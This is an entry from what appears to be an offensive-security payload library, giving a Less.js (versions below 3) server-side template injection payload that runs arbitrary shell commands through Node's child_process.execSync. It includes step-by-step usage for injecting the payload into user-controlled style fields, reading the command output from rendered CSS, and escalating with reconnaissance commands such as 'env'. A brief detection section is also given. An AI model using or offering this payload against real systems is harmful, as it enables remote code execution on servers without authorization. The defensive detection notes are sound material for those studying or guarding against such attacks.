---
id: 55394cb8-c321-4b0f-b595-a75f6e6feabf
type: code
language: less
verified: true
created_at: '2023-04-06T03:56:40.012285+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - ssti
  - rce
  - lessjs
  - payload
platforms:
  - Web
  - Node.js
validated: true
---

# Lessjs-SSTI-Command-Execution-Payload

## Code

```less
body {
  color: `global.process.mainModule.require("child_process").execSync("$COMMAND")`;
}
```

## Description

This Less code snippet exploits SSTI in Lessjs < v3 by injecting JavaScript to require the Node.js child_process module and execute an arbitrary shell command synchronously. The output of the command is captured and used as the value for the CSS 'color' property on the 'body' selector, making it visible in the rendered page. It escapes the Less template context using backticks to evaluate as JavaScript, accessing Node globals to perform RCE. This payload is designed for injection into user-controllable template fields, such as dynamic CSS properties.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $COMMAND | The shell command to execute on the target server | `id` |

## Usage

Inject this payload into a Less template via user input, such as a form field that sets CSS styles based on user data (e.g., user ID for theming). The server must process the Less file with vulnerable Lessjs < v3. After injection, trigger the template rendering (e.g., page load or form submission) to execute the command. Observe the output in the browser's CSS inspector. For escalation, replace $COMMAND with reconnaissance commands like 'ls' or 'env' to map the environment.

This code is used in the procedure [[procedures/Lessjs-Command-Execution-via-SSTI]] during payload crafting.

## Detection

- Monitor Node.js application logs for child_process.execSync calls from template processing contexts.
- Scan rendered CSS for anomalous values containing system output (e.g., UID/GID strings in color properties).
- Implement runtime protection in Node.js to restrict module requires in template engines.
- Use error logging to detect failed template compilations with JavaScript syntax.

## Related

- [[procedures/Lessjs-Command-Execution-via-SSTI]]
